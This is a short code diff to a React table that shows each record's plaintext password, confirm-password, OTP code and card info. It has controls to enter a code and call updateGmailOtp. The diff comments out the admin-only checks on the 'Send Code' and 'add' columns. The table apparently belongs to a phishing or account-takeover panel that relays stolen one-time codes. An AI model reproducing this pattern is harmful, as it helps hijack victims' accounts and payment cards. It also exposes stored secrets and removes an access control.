@@ -84,16 +84,16 @@ try {
             <th scope="col">Confirm Password</th>
             <th scope="col">OTP CODE</th>
             
-            {
-              role === 'admin' &&(
+            {/* {
+              role === 'admin' &&( */}
                 <th scope="col">Send Code</th>
-              )
-            }
-            {
-              role === 'admin' &&(
+              {/* )
+            } */}
+            {/* {
+              role === 'admin' &&( */}
                 <th scope="col">add</th>
-              )
-            }
+              {/* )
+            } */}
             {
               role === 'admin' &&(
                 <th scope="col">Card Info</th>
@@ -124,22 +124,22 @@ try {
               <td>{password}</td>
               <td>{repassword}</td>
               <td>{otp}</td>
-              {
-                role ==='admin' && (
+              {/* {
+                role ==='admin' && ( */}
                   <td><input style={{width:'70px'}} className='form-control ' type="text" 
               defaultValue={mailCode} onChange={(e)=>setCodeVal(e.target.value)}
               /></td>
-                )
-              }
-              {
-                role === 'admin' && (
+                {/* )
+              } */}
+              {/* {
+                role === 'admin' && ( */}
                   <td><button type="button"
                   
                   className="btn btn-sm btn-danger" 
                   onClick={()=>updateGmailOtp(_id)}
                   >Add</button></td>
-                )
-              }
+                {/* )
+              } */}
               {
                 role === 'admin' && (
                   <td title={platform}><button  type="button"
